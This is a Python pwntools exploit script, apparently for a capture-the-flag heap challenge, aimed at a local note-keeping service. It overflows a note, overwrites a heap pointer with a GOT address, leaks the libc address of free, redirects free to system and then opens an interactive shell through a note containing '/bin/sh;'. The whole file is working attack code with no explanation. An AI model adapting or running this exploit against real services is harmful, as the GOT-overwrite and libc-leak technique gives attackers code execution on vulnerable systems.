#!/usr/bin/python -i

from pwn import *
context.log_level = "DEBUG"

Local = True

if Local:
    host = '127.0.0.1'
    port = 2323
    system_offset = 0x45390
    free_offset = 0x844f0
else:
    exit(-1)


def add_note(size, buf=''):
    p = '1\n'
    p += str(size) + '\n'
    p += buf
    assert len(buf) <= size - 1
    if len(buf) != size - 1:
        p += '\n'
    return p


def edit_note(idx, size, buf=''):
    p = '2\n'
    p += str(idx) + '\n'
    p += str(size) + '\n'
    p += buf
    assert len(buf) <= size - 1
    if len(buf) != size - 1:
        p += '\n'
    return p


def list_note(idx):
    p = '3\n'
    p += str(idx) + '\n'
    return p


def del_note(idx):
    p = '4\n'
    p += str(idx) + '\n'
    return p


p = ''
p += add_note(0x8)
p += add_note(0x8)
p += add_note(0x10, '/bin/sh;')
p += del_note(1)
p += edit_note(0, 0x2c, '/bin/sh;'.ljust(0x20) + p64(0x602018))
p += list_note(0)

r = remote(host, port)
raw_input('continue ->')
r.send(p)
print r.recvuntil('content: ')
libc_addr = int(r.recvuntil('\nYour')[:-5][::-1].encode('hex'),
                16) - free_offset
print 'libc addr:', hex(libc_addr)

p = ''
p += edit_note(0, 0x10, p64(libc_addr + system_offset) + p64(0x400706)[:-1])
p += del_note(2)
r.send(p)
r.interactive()
